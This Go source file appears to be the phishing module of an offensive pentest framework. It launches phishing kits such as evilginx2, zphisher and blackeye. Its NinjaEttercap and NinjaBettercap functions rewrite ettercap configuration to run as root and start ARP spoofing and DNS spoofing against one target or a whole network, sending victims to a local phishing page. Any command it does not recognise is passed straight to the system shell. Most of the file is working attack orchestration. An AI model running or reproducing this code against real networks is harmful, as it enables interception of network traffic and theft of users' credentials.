package phishers

import(
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "banners"
    "strings"
    "bcolors"
    "subprocess"
)

var(
    Name = "beef"
    Pass = "Jesus"
    Iface = "eth0"
    LPort = "9999"
    Spoofer = "ettercap"
    FakeDns = "Jesus is coming soon"

    Lhost = LhostIp
    LhostIp, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Gateway, _ = utils.GetDefaultGatewayIP()
    Input, Rhost, Proxy, Function, Target string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{

    "rhost": "",
    "target": "",
    "function": "",
    "name": "beef",
    "iface": "eth0",
    "lport": "9999",
    "password": "Jesus",
    "spoofer": "ettercap",
    "fakedns": "Jesus is coming soon",

    "lhost": LhostIp,
    "output": OutPutDir,
}

func PhishingPentest() {
    for {
        fmt.Printf("%s%safr3%s phishers(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "phishing_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC) 
        scanner.Scan()
        Input = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(Input)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

    "? info":           menus.HelpInfo,
    "help info":        menus.HelpInfo,

    "v":                banners.Version,
    "version":          banners.Version,

    "s":                utils.Sleep,
    "sleep":            utils.Sleep,

    "o":                utils.ListJunks,
    "junks":            utils.ListJunks,
    "outputs":          utils.ListJunks,
    "clear junks":      utils.ClearJunks,
    "clear outputs":    utils.ClearJunks,

    "logs":             subprocess.LogHistory,
    "history":          subprocess.LogHistory,
    "clear logs":       subprocess.ClearHistory,
    "clear history":    subprocess.ClearHistory,

    "? run":            menus.HelpInfoRun,
    "h run":            menus.HelpInfoRun,
    "info run":         menus.HelpInfoRun,
    "help run":         menus.HelpInfoRun,
    "? use":            menus.HelpInfoRun,
    "h use":            menus.HelpInfoRun,
    "info use":         menus.HelpInfoRun,
    "help use":         menus.HelpInfoRun,
    "? exec":           menus.HelpInfoRun,
    "h exec":           menus.HelpInfoRun,
    "info exec":        menus.HelpInfoRun,
    "help exec":        menus.HelpInfoRun,
    "? start":          menus.HelpInfoRun,
    "h start":          menus.HelpInfoRun,
    "info start":       menus.HelpInfoRun,
    "help start":       menus.HelpInfoRun,
    "? launch":         menus.HelpInfoRun,
    "h launch":         menus.HelpInfoRun,
    "info launch":      menus.HelpInfoRun,
    "help launch":      menus.HelpInfoRun,
    "? exploit":        menus.HelpInfoRun,
    "h exploit":        menus.HelpInfoRun,
    "info exploit":     menus.HelpInfoRun,
    "help exploit":     menus.HelpInfoRun,
    "? execute":        menus.HelpInfoRun,
    "h execute":        menus.HelpInfoRun,
    "info execute":     menus.HelpInfoRun,
    "help execute":     menus.HelpInfoRun,

    "set":              menus.HelpInfoSet,
    "h set":            menus.HelpInfoSet,
    "info set":         menus.HelpInfoSet,
    "help set":         menus.HelpInfoSet,

    "tips":             menus.HelpInfoTips,
    "h tips":           menus.HelpInfoTips,
    "? tips":           menus.HelpInfoTips,
    "info tips":        menus.HelpInfoTips,
    "help tips":        menus.HelpInfoTips,

    "show":             menus.HelpInfoShow,
    "? show":           menus.HelpInfoShow,
    "h show":           menus.HelpInfoShow,
    "info show":        menus.HelpInfoShow,
    "help show":        menus.HelpInfoShow,

    "info list":        menus.HelpInfoList,
    "help list":        menus.HelpInfoList,
    "use list":         menus.HelpInfoList,
    "list":             menus.HelpInfoList,

    "? options":        menus.HelpInfOptions,
    "info options":     menus.HelpInfOptions,
    "help options":     menus.HelpInfOptions,

    "banner":           banners.RandomBanners,
    "g":                utils.BrowseTutarilas,
    "t":                utils.BrowseTutarilas,
    "guide":            utils.BrowseTutarilas,
    "tutarial":         utils.BrowseTutarilas,
    "h":                menus.HelpInfoMenuZero,
    "?":                menus.HelpInfoMenuZero,
    "00":               menus.HelpInfoMenuZero,
    "help":             menus.HelpInfoMenuZero,
    "f":                menus.HelpInfoFeatures,
    "use f":            menus.HelpInfoFeatures,
    "features":         menus.HelpInfoFeatures,
    "use features":     menus.HelpInfoFeatures,

    //Chameleons//
    "info":             menus.HelpInfoPhishers,

    "m":                menus.MenuSeven,
    "menu":             menus.MenuSeven,

    "option":           menus.HelpInfOptions,
    "options":          menus.HelpInfOptions,
    "show option":      menus.HelpInfOptions,
    "show options":     menus.HelpInfOptions,

    "show all":         menus.ListPhishersFunctions,
    "list all":         menus.ListPhishersFunctions,

    "func":             menus.ListPhishersFunctions,
    "funcs":            menus.ListPhishersFunctions,
    "functions":        menus.ListPhishersFunctions,
    "show func":        menus.ListPhishersFunctions,
    "list funcs":       menus.ListPhishersFunctions,
    "show funcs":       menus.ListPhishersFunctions,
    "show function":    menus.ListPhishersFunctions,
    "list function":    menus.ListPhishersFunctions,
    "list functions":   menus.ListPhishersFunctions,
    "show functions":   menus.ListPhishersFunctions,

    "module":           menus.ListPhishersFunctions,
    "modules":          menus.ListPhishersFunctions,
    "list module":      menus.ListPhishersFunctions,
    "show module":      menus.ListPhishersFunctions,
    "list modules":     menus.ListPhishersFunctions,
    "show modules":     menus.ListPhishersFunctions,

    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "name": &Name,
        "iface": &Iface,
        "rhost": &Rhost,
        "lport": &LPort,
        "target": &Rhost,
        "proxies": &Proxy,
        "lhost": &LhostIp,
        "password": &Pass,
        "func": &Function,
        "spoofer": &Spoofer,
        "fakedns": &FakeDns,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "name": &Name,
        "iface": &Iface,
        "rhost": &Rhost,
        "lport": &LPort,
        "target": &Rhost,
        "proxies": &Proxy,
        "lhost": &LhostIp,
        "password": &Pass,
        "func": &Function,
        "spoofer": &Spoofer,
        "fakedns": &FakeDns,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
    }
 
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    PhishingPenFunctions(Function)
}

// Helper functions
func autoExecuteFunc(distro string, function string) {
    //Distro = distro
    //Function = function
    executeFunction()
}

func PhishingPenFunctions(Function string, args ...interface{}) {
    fmt.Printf("\nFunction => %s\n", Function)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    commands := map[string]func() {

        "gophish": func() {GoPhish()},
       "goodginx": func() {GoodGinx()},
            "thc": func() {Thc()},
      "setoolkit": func() {SetoolKit()},
       "zphisher": func() {ZPhisher()},
       "blackeye": func() {Blackeye()},
     "shellphish": func() {ShellPhish()},
      "darkphish": func() {Darkphish()},
       "advphish": func() {AdvPhisher()},
    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.YELLOW, bcolors.ENDC, Function, bcolors.DARKGREEN, bcolors.ENDC)
    }
}




func GoPhish() {
    subprocess.Popen(`gophish`)
}

func GoodGinx() {
    subprocess.Popen(`evilginx2`)
}

func Thc() {
    subprocess.Popen(`cd %s/phishers/thc/; bash thc.sh`, ToolsDir)
}

func SetoolKit() {
    subprocess.Popen(`cd %s/phishers/set/; python3 setoolkit`, ToolsDir)
}

func ZPhisher() {
    subprocess.Popen(`cd %s/phishers/zphisher/; bash zphisher.sh`, ToolsDir)
}

func Blackeye() {
    subprocess.Popen(`cd %s/phishers/blackeye/; bash blackeye.sh`, ToolsDir)
}

func ShellPhish() {
    subprocess.Popen(`cd %s/phishers/shellphish/; bash shellphish.sh`, ToolsDir)
}

func Darkphish() {
    subprocess.Popen(`cd %s/phishers/darkphish/; python3 dark-phish.py`, ToolsDir)
}

func AdvPhisher() {
    subprocess.Popen(`cd %s/phishers/advphishing/; bash advphishing.sh`, ToolsDir)
}

func CyberPhish() {
    subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, ToolsDir)
}

func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    scanner.Scan()
    Input := scanner.Text()
    switch strings.ToLower(Input) {
    case "0":
        return
    case "1":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, Iface, Rhost, Gateway)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    case "2":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, Iface)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    default:
        utils.SystemShell(Input)
    }
    fmt.Println()
}

func NinjaBettercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    if Target == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    switch strings.ToLower(Target) {
    case "one":
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, Iface, Rhost)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
    case "all":
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, Iface)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter TARGET. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}

func NinjaPhish(Spoofer string, Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    if Spoofer == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    switch strings.ToLower(Spoofer) {
    case "ettercap":
         NinjaEttercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
    case "bettercap":
         NinjaBettercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
     }
}
